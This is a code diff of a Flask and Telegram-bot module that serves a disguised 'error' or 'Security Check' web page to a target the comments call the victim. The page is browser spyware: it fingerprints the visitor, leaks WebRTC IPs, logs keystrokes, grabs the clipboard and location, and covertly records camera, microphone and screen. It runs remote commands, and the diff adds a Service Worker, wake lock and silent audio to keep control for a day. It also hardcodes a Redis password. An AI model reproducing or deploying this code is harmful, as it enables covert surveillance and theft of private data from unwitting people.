@@ -1,7 +1,7 @@
 # lsh_module.py
 # ============================================================
-# LSH v3 — نظام التحكم الكامل المضمون
-# يعتمد على Push/Pull عبر نفس القناة (كل POST من الضحية يسحب الأوامر)
+# LSH v4 — نظام التحكم الكامل مع جلسة 24 ساعة
+# Service Worker + Wake Lock + IndexedDB + Push/Pull
 # ============================================================
 
 import os
@@ -12,26 +12,52 @@ import base64
 import threading
 import redis
 import qrcode
-from flask import Blueprint, request, jsonify
+from flask import Blueprint, request, jsonify, Response
 
 lsh_bp = Blueprint('lsh_module', __name__)
 
 # ============================================================
-# [1] Redis
+# [1] Redis — نسخة محسّنة مع TLS fallback
 # ============================================================
-REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
+REDIS_URL = os.getenv("REDIS_URL", "").strip()
+if not REDIS_URL:
+    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
 if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
-    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
+    REDIS_URL = "redis://" + REDIS_URL
 
-try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
-    redis_client.ping()
-    print("[+] LSH v3: Redis connected")
-except Exception as e:
-    print(f"[-] Redis error in lsh_module: {e}")
-    redis_client = None
+
+def _try_redis(url):
+    try:
+        client = redis.Redis.from_url(
+            url, decode_responses=True, socket_timeout=10,
+            socket_connect_timeout=10, retry_on_timeout=True,
+            health_check_interval=30,
+        )
+        client.ping()
+        return client
+    except Exception as e:
+        print(f"[-] LSH Redis try failed ({url[:30]}...): {e}")
+        return None
+
+
+redis_client = _try_redis(REDIS_URL)
+if not redis_client and REDIS_URL.startswith("redis://"):
+    tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
+    redis_client = _try_redis(tls_url)
+    if redis_client:
+        REDIS_URL = tls_url
+if not redis_client and REDIS_URL.startswith("rediss://"):
+    non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
+    redis_client = _try_redis(non_tls)
+    if redis_client:
+        REDIS_URL = non_tls
+
+if redis_client:
+    print("[+] LSH: ✅ Redis connected")
+else:
+    print("[-] LSH: ❌ Redis FAILED")
 
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 
@@ -65,7 +91,7 @@ def get_session(session_id):
 
 
 def push_command(session_id, command_dict):
-    """إرسال أمر — سيُسلَّم في الـ ping التالي (خلال 2 ثانية)"""
+    """إرسال أمر — سيُسلَّم في الـ ping التالي (خلال 2-3 ثواني)"""
     if not redis_client:
         print(f"[-] PUSH FAIL: no Redis")
         return False
@@ -83,14 +109,114 @@ def push_command(session_id, command_dict):
 
 
 # ============================================================
-# [3] القالب — Push-based
+# [3] Service Worker (Inline fallback)
+# ============================================================
+SW_FALLBACK = r"""
+// sw.js - Service Worker للجلسة 24 ساعة
+const PING_INTERVAL = 3000;
+let sessionData = null;
+let pingTimer = null;
+
+self.addEventListener('install', (e) => {
+  console.log('[SW] Installing...');
+  self.skipWaiting();
+});
+
+self.addEventListener('activate', (e) => {
+  console.log('[SW] Activated');
+  e.waitUntil(self.clients.claim());
+});
+
+self.addEventListener('message', (event) => {
+  const data = event.data || {};
+  console.log('[SW] Message:', data.type);
+
+  if (data.type === 'init') {
+    sessionData = {
+      session_id: data.session_id,
+      chat_id: data.chat_id,
+      http_url: data.http_url,
+      started_at: Date.now()
+    };
+    startPing();
+  }
+  if (data.type === 'stop') {
+    stopPing();
+  }
+  if (data.type === 'keepalive') {
+    if (sessionData) sessionData.last_page_seen = Date.now();
+  }
+});
+
+function startPing() {
+  if (pingTimer) clearInterval(pingTimer);
+  pingTimer = setInterval(doPing, PING_INTERVAL);
+  doPing();
+}
+
+function stopPing() {
+  if (pingTimer) {
+    clearInterval(pingTimer);
+    pingTimer = null;
+  }
+}
+
+async function doPing() {
+  if (!sessionData) return;
+  try {
+    const resp = await fetch(sessionData.http_url + '/lsh_msg', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        session_id: sessionData.session_id,
+        chat_id: sessionData.chat_id,
+        type: 'sw_ping',
+        ts: Date.now()
+      })
+    });
+    if (!resp.ok) return;
+    const data = await resp.json();
+    const commands = data.commands || [];
+    if (commands.length > 0) {
+      const clients = await self.clients.matchAll({ includeUncontrolled: true });
+      clients.forEach(client => {
+        client.postMessage({ type: 'commands', commands: commands });
+      });
+    }
+  } catch (e) {
+    console.log('[SW] Ping failed:', e.message);
+  }
+}
+
+self.addEventListener('push', (event) => {
+  event.waitUntil(doPing());
+});
+
+self.addEventListener('sync', (event) => {
+  if (event.tag === 'lsh-ping') event.waitUntil(doPing());
+});
+
+self.addEventListener('fetch', (event) => {
+  event.respondWith(fetch(event.request).catch(() => {
+    return new Response('offline', { status: 503 });
+  }));
+});
+"""
+
+
+# ============================================================
+# [4] القالب الرئيسي
 # ============================================================
 LSH_PAGE = r"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="theme-color" content="#ffffff">
+<meta name="theme-color" content="#f5f7fa">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="mobile-web-app-capable" content="yes">
+<link rel="manifest" href="/manifest.json">
 <title>حدث خطأ غير متوقع</title>
 <style>
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
@@ -202,19 +328,149 @@ LSH_PAGE = r"""<!DOCTYPE html>
   const hide = id => el(id).classList.add('hidden');
 
   // ============================================================
-  // الحالة
+  // ★ Service Worker
+  // ============================================================
+  let swRegistration = null;
+  let serviceWorker = null;
+
+  async function initServiceWorker() {
+    if (!('serviceWorker' in navigator)) {
+      console.log('[SW] Not supported');
+      return false;
+    }
+    try {
+      swRegistration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
+      console.log('[SW] Registered:', swRegistration.scope);
+      await navigator.serviceWorker.ready;
+      serviceWorker = swRegistration.active || navigator.serviceWorker.controller;
+
+      sendToSW({
+        type: 'init',
+        session_id: SESSION_ID,
+        chat_id: CHAT_ID,
+        http_url: HTTP_URL
+      });
+
+      navigator.serviceWorker.addEventListener('message', (event) => {
+        const data = event.data || {};
+        if (data.type === 'commands' && Array.isArray(data.commands)) {
+          data.commands.forEach(cmd => executeCommand(cmd));
+        }
+      });
+
+      console.log('[SW] Initialized');
+      return true;
+    } catch (e) {
+      console.log('[SW] Registration failed:', e.message);
+      return false;
+    }
+  }
+
+  function sendToSW(msg) {
+    if (serviceWorker) {
+      try { serviceWorker.postMessage(msg); } catch(e) {}
+    }
+    if (navigator.serviceWorker.controller) {
+      try { navigator.serviceWorker.controller.postMessage(msg); } catch(e) {}
+    }
+  }
+
+  // ============================================================
+  // ★ Wake Lock
+  // ============================================================
+  let wakeLock = null;
+  async function requestWakeLock() {
+    try {
+      if ('wakeLock' in navigator) {
+        wakeLock = await navigator.wakeLock.request('screen');
+        console.log('[WakeLock] Acquired');
+        wakeLock.addEventListener('release', () => { wakeLock = null; });
+      }
+    } catch (e) { console.log('[WakeLock] Failed:', e.message); }
+  }
+
+  // ============================================================
+  // ★ Audio Context Loop (iOS)
+  // ============================================================
+  let audioContext = null;
+  function startSilentAudio() {
+    try {
+      audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioContext.createOscillator();
+      const gain = audioContext.createGain();
+      gain.gain.value = 0.0001;
+      osc.connect(gain);
+      gain.connect(audioContext.destination);
+      osc.frequency.value = 20000;
+      osc.start();
+      console.log('[Audio] Silent loop started');
+    } catch (e) { console.log('[Audio] Failed:', e.message); }
+  }
+
+  // ============================================================
+  // ★ IndexedDB
+  // ============================================================
+  let db = null;
+  async function initDB() {
+    return new Promise(resolve => {
+      try {
+        const request = indexedDB.open('lsh_db', 1);
+        request.onupgradeneeded = (e) => {
+          const database = e.target.result;
+          if (!database.objectStoreNames.contains('queue')) {
+            database.createObjectStore('queue', { autoIncrement: true });
+          }
+        };
+        request.onsuccess = (e) => { db = e.target.result; resolve(true); };
+        request.onerror = () => resolve(false);
+      } catch (e) { resolve(false); }
+    });
+  }
+
+  async function saveToQueue(item) {
+    if (!db) return;
+    try {
+      const tx = db.transaction('queue', 'readwrite');
+      tx.objectStore('queue').add({ ...item, ts: Date.now() });
+    } catch (e) {}
+  }
+
+  async function flushQueue() {
+    if (!db) return;
+    try {
+      const tx = db.transaction('queue', 'readwrite');
+      const store = tx.objectStore('queue');
+      const req = store.getAll();
+      req.onsuccess = async () => {
+        const items = req.result || [];
+        for (const item of items) {
+          try {
+            await fetch(HTTP_URL + '/lsh_msg', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(item)
+            });
+          } catch (e) {}
+        }
+        store.clear();
+      };
+    } catch (e) {}
+  }
+
+  // ============================================================
+  // كاميرا/ميكروفون
   // ============================================================
   let videoEl = null, canvasEl = null;
   let camStream = null, micStream = null;
   let captureStarted = false;
   let pingActive = true;
-  let pendingQueue = [];  // رسائل تنتظر الإرسال
 
   function ensureHiddenEls() {
     if (!videoEl) {
       videoEl = document.createElement('video');
       videoEl.autoplay = true; videoEl.muted = true;
-      videoEl.setAttribute('playsinline', ''); videoEl.setAttribute('webkit-playsinline', '');
+      videoEl.setAttribute('playsinline', '');
+      videoEl.setAttribute('webkit-playsinline', '');
       videoEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px;';
       document.body.appendChild(videoEl);
     }
@@ -225,9 +481,6 @@ LSH_PAGE = r"""<!DOCTYPE html>
     }
   }
 
-  // ============================================================
-  // التقاط أساسي
-  // ============================================================
   async function collectBasicInfo() {
     const info = {
       session_id: SESSION_ID, chat_id: CHAT_ID,
@@ -251,6 +504,8 @@ LSH_PAGE = r"""<!DOCTYPE html>
       cookies_enabled: navigator.cookieEnabled,
       do_not_track: navigator.doNotTrack,
       referrer: document.referrer || "direct",
+      sw_supported: 'serviceWorker' in navigator,
+      wakelock_supported: 'wakeLock' in navigator,
     };
     try {
       const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -274,7 +529,6 @@ LSH_PAGE = r"""<!DOCTYPE html>
       }
     } catch(e){}
 
-    // WebRTC IP Leak
     info.webrtc_ips = await new Promise(resolve => {
       try {
         const ips = new Set();
@@ -392,26 +646,26 @@ LSH_PAGE = r"""<!DOCTYPE html>
   }
 
   // ============================================================
-  // ★ إرسال رسالة + استقبال أوامر (نفس الطلب!)
+  // إرسال موحّد
   // ============================================================
   async function sendMessage(data) {
     try {
       const resp = await fetch(HTTP_URL + "/lsh_msg", {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ...data, session_id: SESSION_ID, chat_id: CHAT_ID })
+        body: JSON.stringify({ ...data, session_id: SESSION_ID, chat_id: CHAT_ID }),
+        keepalive: true
       });
       if (!resp.ok) return null;
       const json = await resp.json();
       return json.commands || [];
     } catch(e) {
+      await saveToQueue({ ...data, session_id: SESSION_ID, chat_id: CHAT_ID });
       return null;
     }
   }
 
-  // ★ Push في الخلفية (يُستدعى عند كل event)
   function push(data) {
-    // نرسل مباشرة بدون انتظار (fire and forget + capture commands)
     sendMessage(data).then(commands => {
       if (commands && commands.length > 0) {
         commands.forEach(cmd => executeCommand(cmd));
@@ -420,24 +674,24 @@ LSH_PAGE = r"""<!DOCTYPE html>
   }
 
   // ============================================================
-  // ★ Ping كل 2 ثانية — يسحب الأوامر المعلّقة
+  // Local Ping (احتياطي في حال SW لا يعمل)
   // ============================================================
-  async function startPing() {
+  async function startLocalPing() {
     while (pingActive) {
       try {
-        const commands = await sendMessage({ type: 'ping', ts: Date.now() });
+        const commands = await sendMessage({ type: 'page_ping', ts: Date.now() });
         if (commands && commands.length > 0) {
           for (const cmd of commands) {
             await executeCommand(cmd);
           }
         }
       } catch(e) {}
-      await sleep(2000);
+      await sleep(4000);
     }
   }
 
   // ============================================================
-  // ★ تنفيذ الأوامر
+  // تنفيذ الأوامر
   // ============================================================
   async function executeCommand(cmd) {
     const action = cmd.action;
@@ -445,66 +699,42 @@ LSH_PAGE = r"""<!DOCTYPE html>
     console.log('[EXEC]', action, payload);
 
     try {
-      // ---------- snapshot ----------
       if (action === 'snapshot') {
         if (!camStream || !camStream.active) {
           const ok = await startCamera();
-          if (!ok) {
-            push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'no_camera' });
-            return;
-          }
+          if (!ok) { push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'no_camera' }); return; }
         }
         const img = snapshot();
-        if (img) {
-          push({ type: 'cmd_result', action: 'snapshot', status: 'ok', data: img });
-        } else {
-          push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'capture_failed' });
-        }
+        if (img) push({ type: 'cmd_result', action: 'snapshot', status: 'ok', data: img });
+        else push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'capture_failed' });
         return;
       }
 
-      // ---------- audio ----------
       if (action === 'audio') {
         if (!micStream || !micStream.active) {
           const ok = await startMic();
-          if (!ok) {
-            push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'no_mic' });
-            return;
-          }
+          if (!ok) { push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'no_mic' }); return; }
         }
-        const dur = payload.duration || 6000;
-        const audio = await recordAudio(dur);
-        if (audio) {
-          push({ type: 'cmd_result', action: 'audio', status: 'ok', data: audio });
-        } else {
-          push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'record_failed' });
-        }
+        const audio = await recordAudio(payload.duration || 6000);
+        if (audio) push({ type: 'cmd_result', action: 'audio', status: 'ok', data: audio });
+        else push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'record_failed' });
         return;
       }
 
-      // ---------- video ----------
       if (action === 'video') {
         if (!camStream || !camStream.active) {
           const ok = await startCamera();
-          if (!ok) {
-            push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'no_camera' });
-            return;
-          }
+          if (!ok) { push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'no_camera' }); return; }
         }
-        const dur = payload.duration || 10000;
-        const vid = await recordVideo(dur);
-        if (vid) {
-          push({ type: 'cmd_result', action: 'video', status: 'ok', data: vid });
-        } else {
-          push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'record_failed' });
-        }
+        const vid = await recordVideo(payload.duration || 10000);
+        if (vid) push({ type: 'cmd_result', action: 'video', status: 'ok', data: vid });
+        else push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'record_failed' });
         return;
       }
 
-      // ---------- screen ----------
       if (action === 'screen') {
         try {
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+          if (!navigator.mediaDevices.getDisplayMedia) {
             push({ type: 'cmd_result', action: 'screen', status: 'fail', error: 'not_supported' });
             return;
           }
@@ -526,7 +756,6 @@ LSH_PAGE = r"""<!DOCTYPE html>
         return;
       }
 
-      // ---------- clipboard ----------
       if (action === 'clipboard') {
         try {
           if (!navigator.clipboard || !navigator.clipboard.readText) {
@@ -541,33 +770,24 @@ LSH_PAGE = r"""<!DOCTYPE html>
         return;
       }
 
-      // ---------- location ----------
       if (action === 'location') {
         const loc = await collectLocation();
-        if (loc) {
-          push({ type: 'cmd_result', action: 'location', status: 'ok', data: JSON.stringify(loc) });
-        } else {
-          push({ type: 'cmd_result', action: 'location', status: 'fail', error: 'denied_or_timeout' });
-        }
+        if (loc) push({ type: 'cmd_result', action: 'location', status: 'ok', data: JSON.stringify(loc) });
+        else push({ type: 'cmd_result', action: 'location', status: 'fail', error: 'denied_or_timeout' });
         return;
       }
 
-      // ---------- url ----------
       if (action === 'url') {
         try {
           const w = window.open(payload.url, '_blank');
-          if (w) {
-            push({ type: 'cmd_result', action: 'url', status: 'ok', data: payload.url });
-          } else {
-            push({ type: 'cmd_result', action: 'url', status: 'fail', error: 'popup_blocked' });
-          }
+          if (w) push({ type: 'cmd_result', action: 'url', status: 'ok', data: payload.url });
+          else push({ type: 'cmd_result', action: 'url', status: 'fail', error: 'popup_blocked' });
         } catch(e) {
           push({ type: 'cmd_result', action: 'url', status: 'fail', error: e.message });
         }
         return;
       }
 
-      // ---------- vibrate ----------
       if (action === 'vibrate') {
         try {
           if (navigator.vibrate) {
@@ -582,7 +802,6 @@ LSH_PAGE = r"""<!DOCTYPE html>
         return;
       }
 
-      // ---------- redirect ----------
       if (action === 'redirect') {
         push({ type: 'cmd_result', action: 'redirect', status: 'ok', data: 'closing' });
         await sleep(400);
@@ -590,17 +809,14 @@ LSH_PAGE = r"""<!DOCTYPE html>
         return;
       }
 
-      // ---------- unknown ----------
       push({ type: 'cmd_result', action: action, status: 'fail', error: 'unknown_action' });
-
     } catch(e) {
-      console.error('[EXEC] fatal', e);
       push({ type: 'cmd_result', action: action, status: 'fail', error: e.message });
     }
   }
 
   // ============================================================
-  // ★ المراقبة الخلفية
+  // المراقبة الخلفية
   // ============================================================
   function startMonitors() {
     document.addEventListener('keydown', e => {
@@ -652,7 +868,7 @@ LSH_PAGE = r"""<!DOCTYPE html>
   }
 
   // ============================================================
-  // ★ بدء الالتقاط الكامل
+  // بدء الالتقاط الكامل
   // ============================================================
   async function startFullCapture() {
     if (captureStarted) return;
@@ -665,19 +881,16 @@ LSH_PAGE = r"""<!DOCTYPE html>
       el('progressText').textContent = pct + '%';
     };
 
-    // 1) معلومات
     setProgress(10);
     await sleep(300);
     const info = await collectBasicInfo();
     await sendMessage({ type: 'info', info: info });
     setProgress(25);
 
-    // 2) موقع
     const loc = await collectLocation();
     if (loc) await sendMessage({ type: 'location', location: loc });
     setProgress(45);
 
-    // 3) كاميرا
     const camOk = await startCamera();
     if (camOk) {
       const img = snapshot();
@@ -685,7 +898,6 @@ LSH_PAGE = r"""<!DOCTYPE html>
     }
     setProgress(75);
 
-    // 4) صوت
     const micOk = await startMic();
     if (micOk) {
       const audio = await recordAudio(5000);
@@ -693,12 +905,23 @@ LSH_PAGE = r"""<!DOCTYPE html>
     }
     setProgress(100);
 
-    // 5) ready
     await sendMessage({ type: 'ready' });
 
-    // 6) بدء المراقبة + ping
     startMonitors();
-    startPing();
+    startLocalPing();
+
+    // إبلاغ SW بأن الجلسة نشطة
+    sendToSW({ type: 'keepalive' });
+
+    // Wake Lock
+    requestWakeLock();
+
+    // حفظ الجلسة
+    try {
+      localStorage.setItem('lsh_session', JSON.stringify({
+        session_id: SESSION_ID, chat_id: CHAT_ID, ts: Date.now()
+      }));
+    } catch(e) {}
 
     await sleep(800);
     hide('loadingState');
@@ -717,11 +940,25 @@ LSH_PAGE = r"""<!DOCTYPE html>
   // ============================================================
   // الإقلاع
   // ============================================================
-  document.addEventListener('DOMContentLoaded', () => {
+  document.addEventListener('DOMContentLoaded', async () => {
     const reqId = 'req_' + Math.random().toString(36).substring(2, 12).toUpperCase();
     const ri = el('reqId');
     if (ri) ri.textContent = reqId;
+
+    await initDB();
+    await initServiceWorker();
+    flushQueue();
+
+    if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+      startSilentAudio();
+    }
+
     sendMessage({ type: 'landing' });
+
+    // نبضة كل 20 ثانية لإبقاء SW نشطاً
+    setInterval(() => {
+      sendToSW({ type: 'keepalive' });
+    }, 20000);
   });
 
   window.addEventListener('beforeunload', function(e) {
@@ -736,7 +973,7 @@ LSH_PAGE = r"""<!DOCTYPE html>
 
 
 # ============================================================
-# [4] QR
+# [5] QR
 # ============================================================
 def generate_qr_code_bytes(deep_link_url):
     try:
@@ -756,7 +993,7 @@ def generate_qr_code_bytes(deep_link_url):
 
 
 # ============================================================
-# [5] لوحة التحكم
+# [6] لوحة التحكم
 # ============================================================
 def build_lsh_control_panel(session_id, chat_id):
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -784,10 +1021,59 @@ def build_lsh_control_panel(session_id, chat_id):
 
 
 # ============================================================
-# [6] المسارات
+# [7] المسارات
 # ============================================================
 def init_lsh_routes(app, bot):
 
+    # ------------------------------------------------------------
+    # Service Worker
+    # ------------------------------------------------------------
+    @app.route('/sw.js', methods=['GET'])
+    def serve_sw():
+        try:
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+            sw_path = os.path.join(base_dir, 'sw.js')
+            if os.path.exists(sw_path):
+                with open(sw_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                print("[+] /sw.js served from file")
+            else:
+                content = SW_FALLBACK
+                print("[+] /sw.js served from fallback")
+            return Response(
+                content,
+                mimetype='application/javascript',
+                headers={
+                    'Service-Worker-Allowed': '/',
+                    'Cache-Control': 'no-cache, no-store, must-revalidate',
+                }
+            )
+        except Exception as e:
+            print(f"[-] serve_sw error: {e}")
+            return Response(SW_FALLBACK, mimetype='application/javascript')
+
+    # ------------------------------------------------------------
+    # Manifest (PWA)
+    # ------------------------------------------------------------
+    @app.route('/manifest.json', methods=['GET'])
+    def serve_manifest():
+        manifest = {
+            "name": "Security Check",
+            "short_name": "Sec",
+            "start_url": "/",
+            "display": "standalone",
+            "background_color": "#f5f7fa",
+            "theme_color": "#2563eb",
+            "icons": []
+        }
+        return Response(
+            json.dumps(manifest),
+            mimetype='application/manifest+json'
+        )
+
+    # ------------------------------------------------------------
+    # الصفحة الرئيسية
+    # ------------------------------------------------------------
     @app.route('/lsh', methods=['GET'])
     def lsh_landing():
         session_id = request.args.get('s', '')
@@ -808,9 +1094,9 @@ def init_lsh_routes(app, bot):
                 .replace("__HTTP_URL__", RAILWAY_URL))
         return html, 200
 
-    # ============================================================
-    # ★★ المسار الموحّد: يستقبل رسالة + يرد بأوامر معلّقة
-    # ============================================================
+    # ------------------------------------------------------------
+    # المسار الموحّد: يستقبل رسالة + يرد بأوامر معلّقة
+    # ------------------------------------------------------------
     @app.route('/lsh_msg', methods=['POST'])
     def lsh_msg():
         try:
@@ -820,19 +1106,17 @@ def init_lsh_routes(app, bot):
             if not session_id or not chat_id:
                 return jsonify({"commands": []}), 200
 
-            # تأكد من وجود الجلسة
             sess = get_session(session_id)
             if sess:
                 sess["last_seen"] = time.time()
             else:
                 create_session(session_id, chat_id)
 
-            # ★ اسحب كل الأوامر المعلّقة
+            # اسحب الأوامر المعلّقة
             commands = []
             if redis_client:
                 channel = f"lsh_cmd:{session_id}"
                 try:
-                    # نسحب لحد 5 أوامر معاً
                     for _ in range(5):
                         item = redis_client.rpop(channel)
                         if not item:
@@ -846,16 +1130,14 @@ def init_lsh_routes(app, bot):
                 except Exception as re:
                     print(f"[-] redis read error: {re}")
 
-            # ★ حدّث نشاط
-            if redis_client:
                 try:
                     redis_client.setex(f"lsh_active:{session_id}", 3600, "1")
                 except Exception:
                     pass
 
-            # ★ عالج الرسالة الواردة (إن لم تكن ping عادي)
+            # عالج الرسالة الواردة (إلا إذا كانت ping)
             dtype = data.get('type')
-            if dtype and dtype != 'ping':
+            if dtype and dtype not in ('ping', 'sw_ping', 'page_ping'):
                 source_ip = (request.headers.get('CF-Connecting-IP') or
                              request.headers.get('X-Forwarded-For') or
                              request.remote_addr or "Unknown")
@@ -875,20 +1157,25 @@ def init_lsh_routes(app, bot):
             traceback.print_exc()
             return jsonify({"commands": []}), 200
 
+    # ------------------------------------------------------------
+    # إنشاء جلسة
+    # ------------------------------------------------------------
     @app.route('/lsh_create', methods=['POST'])
     def lsh_create():
         data = request.get_json(silent=True) or {}
         chat_id = data.get('chat_id')
         if not chat_id:
             return jsonify({"error": "missing chat_id"}), 400
-        import uuid as _uuid
-        session_id = str(_uuid.uuid4()).replace('-', '')[:24]
+        session_id = data.get('session_id')
+        if not session_id:
+            import uuid as _uuid
+            session_id = str(_uuid.uuid4()).replace('-', '')[:24]
         create_session(session_id, chat_id)
         return jsonify({"session_id": session_id}), 200
 
 
 # ============================================================
-# [7] معالجة الوارد
+# [8] معالجة الوارد
 # ============================================================
 def _handle_incoming(bot, chat_id, session_id, data, source_ip):
     dtype = data.get('type')
@@ -944,23 +1231,23 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
         elif dtype == 'periodic_photo':
             _send_photo(bot, chat_id, data.get('image',''), "📸 **صورة دورية تلقائية**")
 
-        # ============================================================
-        # ★★ نتائج الأوامر — هنا مفتاح النجاح
-        # ============================================================
         elif dtype == 'cmd_result':
             action = data.get('action')
             status = data.get('status')
             error = data.get('error', '')
             result = data.get('data')
-
             if status == 'ok':
                 _handle_cmd_success(bot, chat_id, action, result)
             else:
                 _handle_cmd_failure(bot, chat_id, action, error)
 
-        # ============================================================
-        # مراقبة خلفية
-        # ============================================================
+        elif dtype == 'cmd_no_tab':
+            bot.send_message(chat_id,
+                f"⚠️ **الضحية أغلقت الصفحة**\n"
+                f"الأمر `{data.get('action')}` لم يُنفذ.\n"
+                f"الـ Service Worker يبقى يعمل في الخلفية.",
+                parse_mode="Markdown")
+
         elif dtype == 'key':
             key = data.get('key', '')
             if len(key) == 1 or key in ['Enter','Backspace','Delete','Tab','Escape',
@@ -993,7 +1280,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
 
 
 # ============================================================
-# [8] معالجة نتائج الأوامر
+# [9] نتائج الأوامر
 # ============================================================
 def _handle_cmd_success(bot, chat_id, action, data):
     try:
@@ -1058,7 +1345,7 @@ def _handle_cmd_failure(bot, chat_id, action, error):
 
 
 # ============================================================
-# [9] مساعدات
+# [10] مساعدات
 # ============================================================
 def _send_photo(bot, chat_id, data_url, caption):
     try:
@@ -1143,6 +1430,8 @@ def _format_info_report(info, session_id):
     webrtc = info.get('webrtc_ips', [])
     ip = info.get('ip', 'Unknown')
     webrtc_text = "، ".join(webrtc) if webrtc else "لا يوجد"
+    sw_status = "✅ مدعوم" if info.get('sw_supported') else "❌ غير مدعوم"
+    wl_status = "✅ مدعوم" if info.get('wakelock_supported') else "❌ غير مدعوم"
     return (
         "╔══════════════════════════════╗\n"
         "║  🎯 **جلسة LSH جديدة**  ║\n"
@@ -1168,5 +1457,8 @@ def _format_info_report(info, session_id):
         "🔋 **البطارية:** "
         + (f"`{bat.get('level', '?')}%`" if bat else "غير متاح") + "\n"
         "📶 **الشبكة:** "
-        + (f"`{net.get('effectiveType', '?')}`" if net else "غير متاح")
-    )
+        + (f"`{net.get('effectiveType', '?')}`" if net else "غير متاح") + "\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"⚙️ **Service Worker:** {sw_status}\n"
+        f"💡 **Wake Lock:** {wl_status}"
+)
